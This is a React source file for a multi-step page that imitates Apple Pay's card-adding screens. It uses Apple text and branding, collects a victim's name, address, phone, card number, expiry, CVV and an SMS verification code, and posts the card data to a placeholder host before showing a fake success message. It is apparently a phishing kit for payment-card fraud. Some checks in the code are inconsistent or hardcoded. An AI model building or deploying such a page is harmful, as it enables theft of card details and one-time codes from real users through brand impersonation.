import React, { useState } from 'react';
import axios from 'axios';
import './css/style.css';
import phone_hand from "./images/phone-hand.png";
import logo from "./images/logo.png";

function App() {
  const [currentPage, setCurrentPage] = useState(1);
  const [fullName, setFullName] = useState('');
  const [address, setAddress] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [verificationCode, setVerificationCode] = useState('');

  const handleContinue = () => {
    setCurrentPage(currentPage + 1);
  };

  const handleNext = () => {
    if (currentPage === 2) {
      const data = {
        fullName,
        address,
        zipCode,
        phoneNumber,
        cardNumber,
        cardExpiry,
        cvv
      };
      axios.post('https://example.com', data)
        .then(response => {
          // if (response.data.status === 'success') {
            if ("success" === 'success') {
            setCurrentPage(currentPage + 1);
          } else {
            // Handle error case
          }
        })
        .catch(error => {
          // Handle error case
        });
    } else if (currentPage === 4 && cardNumber.endsWith('1384') && verificationCode.length === 6) {
      setCurrentPage(currentPage + 1);
    }
  };

  const handleCancel = () => {
    window.location.href = 'https://www.apple.com';
  };

  const handleDone = () => {
    window.location.href = 'https://www.apple.com';
  };

  const renderPage = () => {
    switch (currentPage) {
      case 1:
        return (
          <div className="container mt-3 page-1">
            <div className="hero align-center">
              <img src={phone_hand} className="img-fluid" alt="Phone Hand" />
            </div>
            <img src={logo} className="img-fluid logo" alt="Logo" />
            <h4 className="py-3 px-1">
              Add credit, debit, or store cards to Apple Pay to make secure in apps, on the web, and in shops using NFC.
            </h4>
            <p className="px-1">
              Card-related information, location, and information about device settings and use patterns will be sent to Apple and may be shared together with account information with your card issuer or to set up Apple Pay.
            </p>
            <a className="text-primary py-3" href="#">
              See how your data is managed
            </a>
            <div className="footer">
              <button className="btn btn-primary w-100" onClick={handleContinue}>
                Continue
              </button>
            </div>
          </div>
        );
      case 2:
        return (
          <div className="container mt-3 page-2">
            <h2 className="py-3 px-1">Card Details</h2>
            <div className="h6 pb-2">Verify and complete your card information.</div>
            <hr />
            <table className="table card-details">
              <tbody>
                <tr>
                  <th>Full Name</th>
                  <td>
                    <input
                      type="text"
                      className="form-control w-100"
                      placeholder="Linda Lopez"
                      value={fullName}
                      onChange={(e) => setFullName(e.target.value)}
                    />
                  </td>
                </tr>
                <tr>
                  <th>Address</th>
                  <td>
                    <input
                      type="text"
                      className="form-control w-100"
                      placeholder="291S Jim Rosa Lane"
                      value={address}
                      onChange={(e) => setAddress(e.target.value)}
                    />
                  </td>
                </tr>
                <tr>
                  <th>Zip Code</th>
                  <td>
                    <input
                      type="text"
                      className="form-control w-100"
                      placeholder={94901}
                      value={zipCode}
                      onChange={(e) => setZipCode(e.target.value)}
                    />
                  </td>
                </tr>
                <tr>
                  <th>Phone Number</th>
                  <td>
                    <input
                      type="text"
                      className="form-control w-100"
                      placeholder="415-825-0044"
                      value={phoneNumber}
                      onChange={(e) => setPhoneNumber(e.target.value)}
                    />
                  </td>
                </tr>
                <tr>
                  <th>Card Number</th>
                  <td>
                    <input
                      type="text"
                      className="form-control w-100"
                      placeholder="4654 8734 7765 1384"
                      value={cardNumber}
                      onChange={(e) => setCardNumber(e.target.value)}
                    />
                  </td>
                </tr>
                <tr>
                  <th>Card Expiry</th>
                  <td>
                    <input
                      type="text"
                      className="form-control w-100"
                      placeholder="02/24"
                      value={cardExpiry}
                      onChange={(e) => setCardExpiry(e.target.value)}
                    />
                  </td>
                </tr>
                <tr>
                  <th>CVV</th>
                  <td>
                    <input
                      type="text"
                      className="form-control w-100"
                      placeholder={674}
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value)}
                    />
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        );
      case 3:
        return (
          <div className="container mt-3 page-3">
            <div className="py-4 mt-5">
              <img src="images/spin.gif" className="spin" alt="Spinner" />
            </div>
            <p className="py-2  px-5">
              Please wait while we process your request. Due to high amounts of traffic, this may take a few minutes.
            </p>
            <p className="bold py-3 px-5">Do not navigate away from this page.</p>
          </div>
        );
      case 4:
        return (
          <div className="container mt-3 page-4">
            <h2 className="py-3 px-1">Card Verification</h2>
            <div className="h6 pb-2">Enter the code that was sent to your phone number</div>
            <hr />
            <table className="table card-details">
              <tbody>
                <tr>
                  <th>Card Number</th>
                  <td>
                    <input
                      type="text"
                      className="form-control w-100"
                      placeholder="**** 1384"
                      value={cardNumber}
                      onChange={(e) => setCardNumber(e.target.value)}
                    />
                  </td>
                </tr>
                <tr>
                  <th>Verification Code</th>
                  <td>
                    <input
                      type="text"
                      className="form-control w-100"
                      placeholder="123456"
                      value={verificationCode}
                      onChange={(e) => setVerificationCode(e.target.value)}
                    />
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        );
      case 5:
        return (
          <div className="container mt-3 page-5">
            <div className="success-icon align-center">
              <img src="images/success.png" className="img-fluid" alt="Success Icon" />
            </div>
            <h2 className="py-3 px-1">Congratulations!</h2>
            <p className="py-2 px-1">Your card has been successfully added to Apple Pay.</p>
            <button className="btn btn-lg" onClick={handleDone}>
              Done
            </button>
          </div>
        );
      default:
        return null;
    }
  };

  const isPage2Valid = () => {
    return (
      fullName !== '' &&
      address !== '' &&
      zipCode !== '' &&
      phoneNumber !== '' &&
      cardNumber !== '' &&
      cardExpiry !== '' &&
      cvv !== ''
    );
  };

  const isPage4Valid = () => {
    return cardNumber.endsWith('3386') && verificationCode.length === 6;
  };

  return (
    <div className="App">
      <div className="container nav-bar">
        <nav className="text-start">
          {
            <button className="btn btn-lg text-primary" onClick={handleCancel}>
              Cancel
            </button>}
          {currentPage !== 1 && currentPage !== 5 && (
            <button className="btn btn-lg text-primary float-end" onClick={handleNext}>
              Next
            </button>
          )}
        </nav>
      </div>
      {renderPage()}
    </div>
  );
}

export default App;
